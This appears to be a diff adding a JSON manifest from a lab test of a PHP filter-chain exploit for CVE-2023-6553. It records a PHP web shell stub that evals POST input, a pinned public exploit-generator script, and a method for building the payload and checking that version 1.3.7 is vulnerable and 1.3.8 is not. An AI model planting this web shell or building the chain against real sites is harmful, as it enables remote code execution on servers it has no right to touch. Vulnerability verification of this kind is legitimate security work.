@@ -1,0 +1,13 @@
+{
+  "stub": "<?php eval($_POST['labprobe']);?>",
+  "filter_sha256": "f58065e4a0f065f5f1b5b17ad1d2cf2871a912a4a0e2d70ce37c06fa3dd1bd12",
+  "filter_bytes": 6839,
+  "generator": {
+    "url": "https://raw.githubusercontent.com/Chocapikk/CVE-2023-6553/30f0eff73edc04f93fbcbd143705b8dcde1687f7/php_filter_chain.py",
+    "bytes": 7610,
+    "sha256": "14ab93c0bf443e28cf5094494db4b64d120a2af1b3cde320a8c1cdd3e772054f"
+  },
+  "generator_commit": "30f0eff73edc04f93fbcbd143705b8dcde1687f7",
+  "method": "Extract self.conversions with Python ast.literal_eval; standard base64 encode without padding, reverse characters, apply the published filter ordering. No Framework helper or owner loaded.",
+  "native_prerequisite": "native-20261118t073316: three exact-byte UID 33 markers on unchanged 1.3.7; all absent on unchanged 1.3.8"
+}
